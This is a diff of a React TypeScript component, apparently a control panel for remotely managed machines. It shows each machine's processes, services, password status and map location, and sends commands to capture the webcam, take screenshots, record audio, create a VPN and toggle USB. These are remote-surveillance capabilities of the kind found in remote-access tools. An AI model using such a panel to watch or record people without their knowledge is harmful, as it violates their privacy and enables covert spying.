@@ -19,42 +19,44 @@ import { MapContainer, Marker, Popup, TileLayer } from 'react-leaflet';
 import 'leaflet/dist/leaflet.css';
 
 const { TabPane } = Tabs;
-const backendUrl = 'http://localhost:9000';
 
-// --- Типы данных ---
-interface Device {
-    id: string;
-    device_identifier: string;
-    user_id?: string;
-    description?: string;
-    status: string;
-    last_seen: string; // ISO string
-    created_at: string;
-    updated_at: string;
-}
+const backendUrl = 'http://localhost:4000';
 
-interface Metric {
-    id: string;
-    device_id: string;
-    public_ip: string;
-    hostname: string;
-    os_info: string;
+// ---------- Типы данных ----------
+interface Metrics {
     disk_total: number;
-    disk_used: number;
     disk_free: number;
     memory_total: number;
-    memory_used: number;
     memory_available: number;
-    process_count: number;
-    cpu_percent: number;
-    bytes_sent: number;
-    bytes_recv: number;
-    created_at: string;
+    processor: string;
+    os: string;
+    has_password: boolean;
+    minimum_password_lenght: number;
+    pc_name: string;
 }
 
-interface ClientDetailsState {
-    device: Device | null;
-    metric: Metric | null;
+interface ProcessInfo {
+    Pid: number;
+    Name: string;
+}
+
+interface ServiceInfo {
+    Name: string;
+    DisplayName: string;
+    Status: string;
+}
+
+interface AppsServices {
+    processes: ProcessInfo[];
+    services: ServiceInfo[];
+}
+
+interface ClientNode {
+    ID: string;
+    IP: string;
+    Status: string;
+    Metrics: Metrics;
+    AppsServices: AppsServices; // Уже объект
 }
 
 interface Location {
@@ -65,82 +67,49 @@ interface Location {
 
 type NotificationType = 'success' | 'info' | 'warning' | 'error';
 
-// --- Компонент для видеостриминга ---
-// При получении бинарных данных (JPEG) создается Blob и отображается в <img>
-interface VideoStreamProps {
-    deviceId: string;
-}
-const VideoStream: React.FC<VideoStreamProps> = ({ deviceId }) => {
-    const [videoSrc, setVideoSrc] = useState<string>('');
-    useEffect(() => {
-        const ws = new WebSocket(`ws://localhost:9000/ws?role=frontend&device_id=${deviceId}`);
-        ws.binaryType = 'arraybuffer';
-        ws.onopen = () => {
-            console.log('VideoStream WebSocket connected');
-        };
-        ws.onmessage = (event) => {
-            const blob = new Blob([event.data], { type: 'image/jpeg' });
-            const url = URL.createObjectURL(blob);
-            setVideoSrc(url);
-        };
-        ws.onerror = (err) => {
-            console.error('VideoStream WebSocket error:', err);
-        };
-        ws.onclose = () => {
-            console.log('VideoStream WebSocket closed');
-        };
-        return () => {
-            ws.close();
-        };
-    }, [deviceId]);
-    return <img src={videoSrc} alt="Live Video" style={{ width: '100%' }} />;
-};
-
-// --- Основной компонент ClientDetails ---
 export const ClientDetails: React.FC = () => {
     const navigate = useNavigate();
-    const { id } = useParams<{ id: string }>();
-    const [notificationApi, contextHolder] = notification.useNotification();
+    const [api, contextHolder] = notification.useNotification();
+    const { id } = useParams();
 
-    // Состояние для данных устройства и метрик
-    const [details, setDetails] = useState<ClientDetailsState>({ device: null, metric: null });
+    // Состояния
+    const [node, setNode] = useState<ClientNode | null>(null);
     const [position, setPosition] = useState<Location | null>(null);
 
-    // Модальные окна для видео, скриншота и аудио
+    // Модалки
     const [webcamModalVisible, setWebcamModalVisible] = useState(false);
     const [screenshotModalVisible, setScreenshotModalVisible] = useState(false);
     const [audioModalVisible, setAudioModalVisible] = useState(false);
 
-    // При открытии модального окна для вебкамеры мы отправляем команду на запуск видеостриминга
+    // Пути к файлам
+    const [webcamUrl, setWebcamUrl] = useState(`${backendUrl}/uploads/latest_frame.jpg`);
+    const [screenshotUrl, setScreenshotUrl] = useState(
+        `${backendUrl}/uploads/latest_screenshot.jpg`
+    );
+    const [audioUrl, setAudioUrl] = useState(`${backendUrl}/uploads/latest_recorded_audio.wav`);
+
+    // ID таймера (снимки вебкамеры)
+    const webcamIntervalRef = useRef<number | null>(null);
+
+    // Загрузка данных
     useEffect(() => {
         if (id) {
-            fetchDeviceDetails();
-            fetchMetricDetails();
+            fetchById();
             fetchMap();
         }
     }, [id]);
 
-    // Запрос для получения данных устройства
-    const fetchDeviceDetails = async () => {
+    // Получаем ClientNode с бэка
+    const fetchById = async () => {
         try {
-            const res = await instance.get<Device>(`/api/devices/${id}`);
-            setDetails((prev) => ({ ...prev, device: res.data }));
+            const res = await instance.get<ClientNode>(`/api/clients/${id}`);
+            setNode(res.data);
         } catch (err) {
-            message.error('Ошибка при получении данных устройства');
+            message.error('Ошибка при получении ноды');
         }
     };
 
-    // Запрос для получения метрик устройства
-    const fetchMetricDetails = async () => {
-        try {
-            const res = await instance.get<Metric>(`/api/metrics/${id}`);
-            setDetails((prev) => ({ ...prev, metric: res.data }));
-        } catch (err) {
-            message.error('Ошибка при получении метрик');
-        }
-    };
-
-    // Запрос для получения координат
+    // Получаем координаты
     const fetchMap = async () => {
         try {
             const res = await instance.get<Location>(`/api/map/${id}`);
@@ -150,7 +119,7 @@ export const ClientDetails: React.FC = () => {
         }
     };
 
-    // Функция отправки команды на сервер
+    // Отправка команд
     const sendCommand = async (cmd: string) => {
         try {
             await instance.post(`/command?cmd=${cmd}&id=${id}`);
@@ -160,20 +129,29 @@ export const ClientDetails: React.FC = () => {
         }
     };
 
+    // Нотификации
     const openNotificationWithIcon = (type: NotificationType, cmd: string) => {
-        notificationApi[type]({
-            message:
-                type === 'success'
-                    ? `Команда "${cmd}" успешно отправлена`
-                    : `Ошибка при отправке команды "${cmd}"`
-        });
+        if (type === 'success') {
+            api[type]({
+                message: `The command "${cmd}" has been sent successfully`
+            });
+        } else if (type === 'error') {
+            api[type]({
+                message: `Error while sending command "${cmd}"`
+            });
+        } else {
+            api[type]({
+                message: `Command "${cmd}" status: ${type}`
+            });
+        }
     };
 
+    // Кнопка назад
     const handleBack = () => {
         navigate(-1);
     };
 
-    // Функция для форматирования размера (байты -> человекочитаемый формат)
+    // Форматирование байтов
     const formatBytes = (bytes: number, decimals = 2) => {
         if (!bytes) return '0 Bytes';
         const k = 1024;
@@ -183,9 +161,10 @@ export const ClientDetails: React.FC = () => {
         return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
     };
 
+    // Координаты карты
     const mapCenter: [number, number] = position ? [position.lat, position.lon] : [51.505, -0.09];
 
-    // Dropdown для управления USB
+    // Dropdown USB
     const usbItems: MenuProps['items'] = [
         {
             key: 'on',
@@ -199,28 +178,57 @@ export const ClientDetails: React.FC = () => {
         }
     ];
 
-    // Обработка открытия вебкам-модального окна
+    // Вебкамера
     const handleOpenWebcamModal = async () => {
-        await sendCommand('start_camera_stream');
+        await sendCommand('start');
         setWebcamModalVisible(true);
+
+        // Каждую секунду обновляем картинку
+        webcamIntervalRef.current = window.setInterval(() => {
+            setWebcamUrl(`${backendUrl}/uploads/latest_frame.jpg?t=${Date.now()}`);
+        }, 1000);
     };
 
     const handleStopWebcamModal = async () => {
-        await sendCommand('stop_camera_stream');
+        await sendCommand('stop');
         setWebcamModalVisible(false);
+
+        if (webcamIntervalRef.current !== null) {
+            clearInterval(webcamIntervalRef.current);
+            webcamIntervalRef.current = null;
+        }
     };
 
     // Скриншот
     const handleScreenshot = async () => {
         await sendCommand('screenshot');
-        setScreenshotModalVisible(true);
+        setTimeout(() => {
+            setScreenshotUrl(`${backendUrl}/uploads/latest_screenshot.jpg?t=${Date.now()}`);
+            setScreenshotModalVisible(true);
+        }, 1000);
     };
 
-    // Запись аудио
+    // Аудио
     const handleRecordAudio = async () => {
         await sendCommand('record_audio');
-        setAudioModalVisible(true);
+        setTimeout(() => {
+            setAudioUrl(`${backendUrl}/uploads/latest_recorded_audio.wav?t=${Date.now()}`);
+            setAudioModalVisible(true);
+        }, 2000);
     };
+
+    // Колонки для процессов
+    const processColumns = [
+        { title: 'PID', dataIndex: 'pid' },
+        { title: 'Name', dataIndex: 'name' }
+    ];
+
+    // Колонки для служб
+    const serviceColumns = [
+        { title: 'Name', dataIndex: 'name' },
+        { title: 'Display Name', dataIndex: 'display_name' },
+        { title: 'Status', dataIndex: 'status' }
+    ];
 
     return (
         <div style={{ padding: 16 }}>
@@ -234,9 +242,9 @@ export const ClientDetails: React.FC = () => {
                 </Col>
                 <Col>
                     <Space>
-                        <Button onClick={handleOpenWebcamModal}>View Webcam</Button>
-                        <Button onClick={() => sendCommand('create_vpn')}>
-                            Create VPN Connection
+                        <Button onClick={handleOpenWebcamModal}>View the webcam</Button>
+                        <Button onClick={() => sendCommand('vpn_create')}>
+                            Create VPN connection
                         </Button>
                         <Button onClick={handleRecordAudio}>Record Audio</Button>
                         <Dropdown menu={{ items: usbItems }} placement="bottomLeft">
@@ -247,40 +255,62 @@ export const ClientDetails: React.FC = () => {
                 </Col>
             </Row>
 
-            {/* Системная информация */}
+            {/* Информация о системе */}
             <div style={{ marginBottom: 16, background: '#fff', padding: 16 }}>
-                {details.device && details.metric ? (
-                    <Descriptions title="System Information" bordered size="small">
-                        <Descriptions.Item label="Hostname">
-                            {details.metric.hostname}
+                {node ? (
+                    <Descriptions title="Information about the system" bordered size="small">
+                        <Descriptions.Item label="Disk total">
+                            {formatBytes(node.Metrics.disk_total)}
                         </Descriptions.Item>
-                        <Descriptions.Item label="OS">{details.metric.os_info}</Descriptions.Item>
-                        <Descriptions.Item label="Disk Total">
-                            {formatBytes(details.metric.disk_total)}
+                        <Descriptions.Item label="Disk free">
+                            {formatBytes(node.Metrics.disk_free)}
                         </Descriptions.Item>
-                        <Descriptions.Item label="Disk Free">
-                            {formatBytes(details.metric.disk_free)}
+                        <Descriptions.Item label="OS">{node.Metrics.os}</Descriptions.Item>
+                        <Descriptions.Item label="Total memory">
+                            {formatBytes(node.Metrics.memory_total)}
                         </Descriptions.Item>
-                        <Descriptions.Item label="Memory Total">
-                            {formatBytes(details.metric.memory_total)}
+                        <Descriptions.Item label="Processor">
+                            {node.Metrics.processor}
                         </Descriptions.Item>
-                        <Descriptions.Item label="Memory Available">
-                            {formatBytes(details.metric.memory_available)}
-                        </Descriptions.Item>
-                        <Descriptions.Item label="CPU Usage">
-                            {details.metric.cpu_percent}%
-                        </Descriptions.Item>
-                        <Descriptions.Item label="Public IP">
-                            {details.metric.public_ip}
-                        </Descriptions.Item>
-                        <Descriptions.Item label="Last Seen">
-                            {new Date(details.device.last_seen).toLocaleString()}
+                        <Descriptions.Item label="Has password">
+                            {node.Metrics.has_password ? 'Yes' : 'No'}
                         </Descriptions.Item>
                     </Descriptions>
                 ) : (
-                    <p>No system information available</p>
+                    <p>Нет данных о метриках</p>
                 )}
             </div>
+
+            {/* Табы */}
+            <Tabs defaultActiveKey="details">
+                {/* <TabPane tab="Details" key="details">
+                    <p>Здесь можно вывести дополнительную информацию о деталях.</p>
+                </TabPane> */}
+
+                {/* Software: processes */}
+                <TabPane tab="Software" key="software">
+                    <Table
+                        dataSource={node?.AppsServices?.processes || []}
+                        columns={processColumns}
+                        rowKey="pid"
+                        pagination={{ pageSize: 5 }}
+                    />
+                </TabPane>
+
+                {/* Service: services */}
+                <TabPane tab="Service" key="service">
+                    <Table
+                        dataSource={node?.AppsServices?.services || []}
+                        columns={serviceColumns}
+                        rowKey="name"
+                        pagination={{ pageSize: 5 }}
+                    />
+                </TabPane>
+
+                <TabPane tab="Scripts" key="scripts">
+                    <p>Какие-то запросы/логи.</p>
+                </TabPane>
+            </Tabs>
 
             {/* Карта */}
             <div style={{ marginTop: 16, padding: 16, background: '#fff' }}>
@@ -294,7 +324,7 @@ export const ClientDetails: React.FC = () => {
                         {position && (
                             <Marker position={[position.lat, position.lon]}>
                                 <Popup>
-                                    Current position: {position.lat}, {position.lon}
+                                    Текущая позиция: {position.lat}, {position.lon}
                                 </Popup>
                             </Marker>
                         )}
@@ -302,15 +332,19 @@ export const ClientDetails: React.FC = () => {
                 </div>
             </div>
 
-            {/* Webcam Modal - включает компонент VideoStream для получения ретранслированного видеопотока */}
+            {/* Webcam Modal */}
             <Modal
-                title="Webcam Streaming"
+                title="Webcam streaming"
                 open={webcamModalVisible}
-                onCancel={handleStopWebcamModal}
-                footer={<Button onClick={handleStopWebcamModal}>Stop Streaming</Button>}
-                width="80%"
+                closable={false}
+                maskClosable={false}
+                footer={<Button onClick={handleStopWebcamModal}>Stop streaming</Button>}
             >
-                {id && <VideoStream deviceId={id} />}
+                <img
+                    src={webcamUrl}
+                    alt="Webcam"
+                    style={{ width: '100%', border: '1px solid #ccc' }}
+                />
             </Modal>
 
             {/* Screenshot Modal */}
@@ -321,7 +355,7 @@ export const ClientDetails: React.FC = () => {
                 footer={null}
             >
                 <img
-                    src={`${backendUrl}/uploads/latest_screenshot.jpg?t=${Date.now()}`}
+                    src={screenshotUrl}
                     alt="Screenshot"
                     style={{ width: '100%', border: '1px solid #ccc' }}
                 />
@@ -329,21 +363,15 @@ export const ClientDetails: React.FC = () => {
 
             {/* Audio Modal */}
             <Modal
-                title="Recorded Audio"
+                title="Recorded audio"
                 open={audioModalVisible}
                 onCancel={() => setAudioModalVisible(false)}
                 footer={null}
             >
-                <audio
-                    src={`${backendUrl}/uploads/latest_recorded_audio.wav?t=${Date.now()}`}
-                    controls
-                    style={{ width: '100%' }}
-                >
+                <audio src={audioUrl} controls style={{ width: '100%' }}>
                     Your browser does not support the audio element.
                 </audio>
             </Modal>
         </div>
     );
 };
-
-export default ClientDetails;
